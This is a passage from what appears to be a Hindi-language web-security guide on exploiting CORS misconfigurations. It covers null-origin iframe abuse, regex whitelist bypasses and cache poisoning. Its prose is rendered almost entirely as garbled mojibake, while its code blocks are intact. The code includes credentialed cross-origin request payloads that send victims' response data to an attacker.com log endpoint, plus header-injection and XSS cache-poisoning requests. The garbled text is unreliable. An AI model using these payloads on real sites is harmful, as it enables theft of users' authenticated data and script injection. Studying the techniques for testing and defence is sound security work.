рдХреЛ рдзреЛрдЦрд╛ рджреЗрддрд╛ рд╣реИред
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### `null` рдЙрддреНрдкрддреНрддрд┐ рдХрд╛ рд╢реЛрд╖рдг

`null` рдЙрддреНрдкрддреНрддрд┐, рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдпрд╛ рд╕реНрдерд╛рдиреАрдп HTML рдлрд╝рд╛рдЗрд▓ рдЬреИрд╕реА рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХреА рдЧрдИ, рдПрдХ рдЕрджреНрд╡рд┐рддреАрдп рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╣реИред рдХреБрдЫ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЗрд╕ рдЙрддреНрдкрддреНрддрд┐ рдХреЛ рд╕реНрдерд╛рдиреАрдп рд╡рд┐рдХрд╛рд╕ рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдлреЗрдж рд╕реВрдЪреАрдмрджреНрдз рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдХрд┐рд╕реА рднреА рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЛ рдПрдХ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдЖрдЗрдлреНрд░реЗрдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ `null` рдЙрддреНрдкрддреНрддрд┐ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ CORS рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рдЫрд▓рдирд╛ рд╣реЛрддрд╛ рд╣реИред
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### рдирд┐рдпрдорд┐рдд рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рдмрд╛рдпрдкрд╛рд╕ рддрдХрдиреАрдХ

рдЬрдм рдбреЛрдореЗрди рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдХрд╛ рд╕рд╛рдордирд╛ рд╣реЛ, рддреЛ рд╣рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдбреЛрдореЗрди рдХреЛ рдПрдХ рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯреЗрдб рдбреЛрдореЗрди рдХреЗ рдЕрдВрдд рдореЗрдВ рдЬреЛрдбрд╝рдиреЗ рдпрд╛ рд╕рдмрдбреЛрдореЗрди рддрдХрдиреАрдХ рдХреЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдЕрд╡рд╕рд░реЛрдВ рдХрд╛ рдЬрд╛рдВрдЪ рдХрд░рдирд╛ рдЕрддреНрдпрдВрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдбреЛрдореЗрди рдорд╛рдиреНрдпрддрд╛ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдирд┐рдпрдорд┐рдд рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐рдпрд╛рдБ рдбреЛрдореЗрди рдирд╛рдордХрд░рдг рдирд┐рдпрдореЛрдВ рдореЗрдВ рдЫреЛрдЯреА-рдЫреЛрдЯреА рдмрд╛рддреЛрдВ рдХреЛ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░ рд╕рдХрддреА рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдФрд░ рдмрд╛рдпрдкрд╛рд╕ рдЕрд╡рд╕рд░ рдкреНрд░рд╕реНрддреБрдд рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

### рдЙрдиреНрдирдд рдирд┐рдпрдорд┐рдд рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рдмрд╛рдпрдкрд╛рд╕

рд░реЗрдЧреЗрдХреНрд╕ рдкреИрдЯрд░реНрди рдЖрдо рддреМрд░ рдкрд░ рдЕрд▓реНрдлрд╛рдиреНрдпреВрдореЗрд░рд┐рдХ, рдбреЙрдЯ (.), рдФрд░ рд╣рд╛рдЗрдлрд╝рди (-) рд╡рд░реНрдгреЛрдВ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдЕрдиреНрдп рд╕рдВрднрд╛рд╡рдирд╛рдУрдВ рдХреЛ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░рддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдмреНрд░рд╛рдЙрдЬрд╝рд░реНрд╕ рдФрд░ рд░реЗрдЧреЗрдХреНрд╕ рдкреИрдЯрд░реНрдиреНрд╕ рджреНрд╡рд╛рд░рд╛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдЕрдиреБрднрд╛рдЧреЛрдВ рдореЗрдВ рдЕрдиреНрдп рд░реВрдк рд╕реЗ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╡рд░реНрдгреЛрдВ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдПрдХ рдбреЛрдореЗрди рдирд╛рдо рд╕реБрд░рдХреНрд╖рд╛ рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рд╕рдлрд╛рд░реА, рдХреНрд░реЛрдо, рдФрд░ рдлрд╝рд╛рдпрд░рдлрд╝реЙрдХреНрд╕ рдХреЗ рдЕрдВрдбрд░рд╕реНрдХреЛрд░ рд╡рд░реНрдгреЛрдВ рдХреЗ рд╕рдВрдмрджреНрдзреЛрдВ рдореЗрдВ рдЙрдиреНрд╣реЗрдВ рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдпрд╣ рджрд┐рдЦрд╛рддрд╛ рд╣реИ рдХрд┐ рдРрд╕реА рд╡рд┐рд╕рдВрдЧрддрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЛрдореЗрди рдорд╛рдиреНрдпрддрд╛ рддрд░реНрдХ рдХреЛ рдШреБрдорд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

**рдЗрд╕ рдмрд╛рдпрдкрд╛рд╕ рдЬрд╛рдВрдЪ рдХреЗ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдФрд░ рд╕реЗрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **рдФрд░** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (153).png>)

### XSS рдХреЗ рдЕрдВрджрд░ рд╕рдмрдбреЛрдореЗрди рд╕реЗ

рдбреЗрд╡рд▓рдкрд░реНрд╕ рдЕрдХреНрд╕рд░ CORS рд╢реЛрд╖рдг рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд╛рддреНрдордХ рдЙрдкрд╛рдп рд▓рд╛рдЧреВ рдХрд░рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдбреЛрдореЗрди рдХреЛ рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрди рд╕рд╛рд╡рдзрд╛рдирд┐рдпреЛрдВ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рд╕рд┐рд╕реНрдЯрдо рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдирд╣реАрдВ рд╣реИред рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯреЗрдб рдбреЛрдореЗрдиреНрд╕ рдореЗрдВ рдПрдХ рд╣реА рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рд╕рдмрдбреЛрдореЗрди рдХреА рдореМрдЬреВрджрдЧреА, CORS рд╢реЛрд╖рдг рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЕрдиреНрдп рд╕реБрд░рдХреНрд╖рд╛ рджреБрд░реБрдкрдпреЛрдЧ, рдЬреИрд╕реЗ рдХрд┐ XSS (рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ), рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рджреНрд╡рд╛рд░ рдЦреЛрд▓ рд╕рдХрддреА рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рд╕реНрдерд┐рддрд┐ рдХреЛ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВ рдЬрд╣рд╛рдВ рдПрдХ рдбреЛрдореЗрди, `requester.com`, рдХреЛ рджреВрд╕рд░реЗ рдбреЛрдореЗрди, `provider.com`, рд╕реЗ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╣реЛ рд╕рдХрддреА рд╣реИ:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
### **рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ**

**[рдЗрд╕ рд╢реЛрдз рд╕реЗ](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)**

рдпрд╣ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ HTTP рд╣реЗрдбрд░ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдХрд╛ рд╢реЛрдз рдХрд░рдХреЗ, рдПрдХ рд╕реНрдЯреЛрд░реНрдб рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ (XSS) рд╡рдВрд╢рд╛рдиреБрдХреНрд░рдордг рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╕реНрдерд┐рддрд┐ рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ рдЬрдм рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди `Origin` рд╣реЗрдбрд░ рдХреЛ рдЕрд╡реИрдз рд╡рд░реНрдгреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реИрдирд┐рдЯрд╛рдЗрдЬрд╝ рдирд╣реАрдВ рдХрд░рддрд╛, рдЦрд╛рд╕рдХрд░ рдЗрдВрдЯрд░рдиреЗрдЯ рдПрдХреНрд╕рдкреНрд▓реЛрд░рд░ рдФрд░ рдПрдЬ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рдВрд╢рд╛рдиреБрдХреНрд░рдордг рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИред рдпреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ `\r` (0x0d) рдХреЛ рдПрдХ рд╡реИрдз HTTP рд╣реЗрдбрд░ рдЯрд░реНрдорд┐рдиреЗрдЯрд░ рдХреЗ рд░реВрдк рдореЗрдВ рджреЗрдЦрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ HTTP рд╣реЗрдбрд░ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреА рд╡рдВрд╢рд╛рдиреБрдХреНрд░рдордгрддрд╛ рд╣реЛрддреА рд╣реИред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрд░реЛрдз рдХреЛ рдзреНрдпрд╛рди рд╕реЗ рджреЗрдЦреЗрдВ рдЬрд╣рд╛рдБ `Origin` рд╣реЗрдбрд░ рдХреЛ рдорд╛рдирд┐рдпреБрдХреНрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```text
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer рдФрд░ Edge рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдЕрдиреБрд╡рд╛рджрд┐рдд рдХрд░рддреЗ рд╣реИрдВ:
```text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
рдЬрдмрдХрд┐ рдПрдХ рд╡реЗрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЛ рдПрдХ рдЧрд▓рдд рд╢реАрд░реНрд╖рдХ рднреЗрдЬрдХрд░ рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХрд╛ рд╕реАрдзрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛ рд╕рдВрднрд╛рд╡рдирд╛рд╢реАрд▓ рдирд╣реАрдВ рд╣реИ, рдПрдХ рддреИрдпрд╛рд░ рдЕрдиреБрд░реЛрдз рдЙрдкрдХрд░рдгреЛрдВ рдЬреИрд╕реЗ рдмрд░реНрдк рд╕реБрдЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рдзрд┐ рдПрдХ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдХреИрд╢ рдХреЛ рдЙрддреНрддрд░ рдмрдЪрд╛рдиреЗ рдФрд░ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдЗрд╕реЗ рдЕрдиреНрдпреЛрдВ рдХреЛ рд╕реЗрд╡рд╛ рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИред рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреЗрд▓реЛрдб рдзреНрдпрд╛рди рджреЗрдиреЗ рдХрд╛ рд▓рдХреНрд╖реНрдп рдкреГрд╖реНрда рдХреЗ рд╡рд░реНрдг рд╕реЗрдЯ рдХреЛ UTF-7 рдореЗрдВ рдмрджрд▓рдирд╛ рд╣реИ, рдЬреЛ рдХрд┐рд╕реА рд╡рд┐рд╢реЗрд╖ рд╕рдВрджрд░реНрдн рдореЗрдВ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рд╡рд░реНрдгреЛрдВ рдХреЛ рдПрдиреНрдХреЛрдб рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдХреЗ рдХрд╛рд░рдг рдПрдХреНрд╕рдПрд╕рдПрд╕ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖реЛрдВ рд╕реЗ рдЕрдХреНрд╕рд░ рдЬреБрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИред

рднрд╡рд┐рд╖реНрдп рдореЗрдВ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рднрдВрдбрд╛рд░рд┐рдд рдПрдХреНрд╕рдПрд╕рдПрд╕ рджреЛрд╖реЛрдВ рдкрд░, [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored) рджреЗрдЦреЗрдВред

**рдзреНрдпрд╛рди рджреЗрдВ**: HTTP рд╣реЗрдбрд░ рдЗрдВрдЬреЗрдХреНрд╢рди рджреЛрд╖реЛрдВ рдХрд╛ рд╢реЛрд╖рдг, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ, рд╕рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрддреНрдд рдЗрдирдкреБрдЯ, рд╕рд╣рд┐рдд рд╣реЗрдбрд░реНрд╕, рдХреА рдорд╛рдиреНрдпрддрд╛ рдФрд░ рд╢реБрджреНрдзрд┐рдХрд░рдг рдХрд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдорд╣рддреНрд╡ рдХреЛ рд╕рд╛рдмрд┐рдд рдХрд░рддрд╛ рд╣реИред рд╣рдореЗрд╢рд╛ рдПрдХ рдордЬрдмреВрдд рд╕реБрд░рдХреНрд╖рд╛ рдореЙрдбрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЬрд┐рд╕рдореЗрдВ рдЗрдирдкреБрдЯ рдорд╛рдиреНрдпрддрд╛ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреА рд╣реИ рддрд╛рдХрд┐ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рджреЛрд╖реЛрдВ рдХреЛ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХреЗред

### **рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ**

**[рдЗрд╕ рдЕрдиреБрд╕рдВрдзрд╛рди рд╕реЗ](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)**

рдЗрд╕ рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ, рдПрдХ рд╡реЗрдм рдкреГрд╖реНрда рдХреА рдПрдХ рдЙрджрд╛рд╣рд░рдг рджреЗрдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рд╕рд╣реА рдПрдиреНрдХреЛрдбрд┐рдВрдЧ рдХреЗ рдмрд┐рдирд╛ рдПрдХ рдХрд╕реНрдЯрдо HTTP рд╣реЗрдбрд░ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкреБрдирдГ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, рд╡реЗрдм рдкреГрд╖реНрда `X-User-id` рд╣реЗрдбрд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХреА рдЧрдИ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкреБрдирдГ рдкреНрд░рдХрдЯ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рджреБрд░реБрдкрдпреЛрдЧреА рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддреА рд╣реИ, рдЬреИрд╕рд╛ рдХрд┐ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд╣рд╛рдВ рд╣реЗрдбрд░ рдореЗрдВ рдПрдХ SVG рдЫрд╡рд┐ рдЯреИрдЧ рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬреЛ рд▓реЛрдб рд╣реЛрдиреЗ рдкрд░ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛрдб рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдХреНрд░реЙрд╕-рдСрд░рд┐рдЬрд┐рди рд░рд┐рд╕реЛрд░реНрд╕ рд╕реЗрдпрд░рд┐рдВрдЧ (CORS) рдиреАрддрд┐рдпрд╛рдБ рдХрд╕реНрдЯрдо рд╣реЗрдбрд░реНрд╕ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, CORS рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЗ рдХрд╛рд░рдг рдмреНрд░рд╛рдЙрдЬрд╝рд░ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕реАрдзреЗ рди рджреА рдЬрд╛рдиреЗ рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдЗрдВрдЬреЗрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рд╕реАрдорд┐рдд рд▓рдЧ рд╕рдХрддрд╛ рд╣реИред рдорд╣рддреНрд╡рдкреВрд░реНрдг рдмрд┐рдВрджреБ рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреИрд╢ рд╡реНрдпрд╡рд╣рд╛рд░ рдХреЛ рд╡рд┐рдЪрд╛рд░ рдореЗрдВ рд▓рд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ `Vary: Origin` рд╣реЗрдбрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рджреНрд╡рд╛рд░рд╛ рджреБрд░реБрдкрдпреЛрдЧреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рдХреИрд╢ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдмрд╛рдж, рдЗрд╕ рдХреИрд╢ рдХреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕реАрдзреЗ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм URL рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдЕрдиреБрд░реЛрдз рдкрд░ рд╕реАрдзреЗ рдкреНрд░рджрд░реНрд╢рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдХреЛ рдЫреЛрдбрд╝рддреЗ рд╣реБрдПред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЧреНрд░рд╛рд╣рдХ-рд╕рд╛рдЗрдб рдХреИрд╢рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдорд▓реЗ рдХреА рд╡рд┐рд╢реНрд╡рд╕рдиреАрдпрддрд╛ рдХреЛ рдмрдврд╝рд╛рддреА рд╣реИред

рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЙрджрд╛рд╣рд░рдг рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреЛ рдПрдХ рд╡реЗрдм рдкреГрд╖реНрда рдХреЗ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдПрдХ JSFiddle рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗред рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдПрдХ рд╕рд░рд▓ рдХреНрд░рд┐рдпрд╛ рдХрд░рддрд╛ рд╣реИ: рдпрд╣ рдПрдХ рдирд┐рд░реНрджрд┐рд╖реНрдЯ URL рдкрд░ рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рджреБрд░реБрдкрдпреЛрдЧреА рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╢рд╛рдорд┐рд▓ рд╣реЗрдбрд░ рд╣реЛрддрд╛ рд╣реИред рд╕рдлрд▓ рдЕрдиреБрд░реЛрдз рдкреВрд░рд╛ рд╣реЛрдиреЗ рдкрд░, рдпрд╣ рд▓рдХреНрд╖реНрдп URL рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИ, рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдпрджрд┐ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ `Vary: Origin` рд╣реЗрдбрд░ рдХрд╛ рд╕рд╣реА рд╕рдВрднрд╛рд▓рди рдХрд┐рдП рдмрд┐рдирд╛ рдХреИрд╢ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдбрд╛рд▓рд╛ рдЧрдпрд╛ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣рд╛рдБ рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рд╕рдВрдХреНрд╖реЗрдкрд┐рдд рд╡рд┐рд╢реНрд▓реЗрд╖рдг рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## рдмрд╛рдпрдкрд╛рд╕

### XSSI (рдХреНрд░реЙрд╕-рд╕рд╛рдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЗрдирдХреНрд▓реВрдЬрди) / JSONP

